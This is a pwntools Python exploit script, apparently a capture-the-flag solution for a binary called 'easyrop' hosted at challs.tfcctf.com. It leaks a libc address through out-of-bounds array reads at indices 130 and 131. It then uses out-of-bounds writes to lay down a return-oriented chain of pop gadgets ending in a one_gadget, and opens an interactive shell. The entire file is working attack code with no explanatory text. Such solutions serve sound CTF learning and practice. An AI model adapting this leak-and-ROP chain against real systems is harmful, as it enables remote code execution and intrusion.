#!/usr/bin/env python3

from pwn import *

exe = ELF("./easyrop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.REMOTE:
        io = remote("challs.tfcctf.com", 30713)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, gdbscript="""
                    set follow-fork-mode parent
               """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    io.sendlineafter(b"read!", b"2")
    io.sendlineafter(b"index:", b"130")
    io.recvuntil(b"The number at index")
    io.recvuntil(b" is ")
    libc_part1 = int(io.recvline().decode('ascii').strip(), 16)

    io.sendlineafter(b"read!", b"2")
    io.sendlineafter(b"index:", b"131")
    io.recvuntil(b"The number at index")
    io.recvuntil(b" is ")
    libc_part2 = int(io.recvline().decode('ascii').strip(), 16)
    libc_leak = libc_part1 | (libc_part2 << 32)
    info(f"leak libc: {hex(libc_leak)}")
    libc.address = libc_leak-171408

    pop_rdx_pop_r12_ret = libc.address + 0x000000000011f497
    pop_rsi_ret = libc.address + 0x000000000002be51
    libc_ret = libc.address + 0x0000000000029cd6
    bin_ret = 0x000000000040101a
    pop_rbp = 0x00000000004011dd

    io.sendline(b"1")
    io.sendline(b"130")
    p1 = pop_rdx_pop_r12_ret & 0xff_ff_ff_ff
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"131")
    p2 = pop_rdx_pop_r12_ret >> 32
    io.sendline(str(p2).encode())

    io.sendline(b"1")
    io.sendline(b"134")
    p1 = 0
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"136")
    p1 = pop_rbp
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"137")
    p1 = 0
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"140")
    p1 = bin_ret
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"142")
    p1 = pop_rbp
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"143")
    p1 = 0
    io.sendline(str(p1).encode())

    # 41
    io.sendline(b"1")
    io.sendline(b"146")
    p1 = bin_ret
    io.sendline(str(p1).encode())

    # 0x0000000000133cdd: xor eax, eax; pop r12; pop rbp; ret;
    two_pops = libc.address + 0x0000000000133cdd

    io.sendline(b"1")
    io.sendline(b"148")
    p1 = two_pops & (2**32-1)
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"149")
    p2 = two_pops >> 32
    io.sendline(str(p2).encode())

    io.sendline(b"1")
    io.sendline(b"154")
    p1 = pop_rsi_ret & (2**32-1)
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"155")
    p2 = pop_rsi_ret >> 32
    io.sendline(str(p2).encode())

    io.sendline(b"1")
    io.sendline(b"158")
    p1 = bin_ret
    io.sendline(str(p1).encode())

    one_gadget = libc.address + 0xebcf8

    io.sendline(b"1")
    io.sendline(b"160")
    p1 = two_pops & (2**32-1)
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"161")
    p2 = two_pops >> 32
    io.sendline(str(p2).encode())

    io.sendline(b"1")
    io.sendline(b"164")
    p1 = exe.bss()+0x500
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"166")
    p1 = one_gadget & (2**32-1)
    io.sendline(str(p1).encode())

    io.sendline(b"1")
    io.sendline(b"167")
    p2 = one_gadget >> 32
    io.sendline(str(p2).encode())

    io.interactive()


if __name__ == "__main__":
    main()

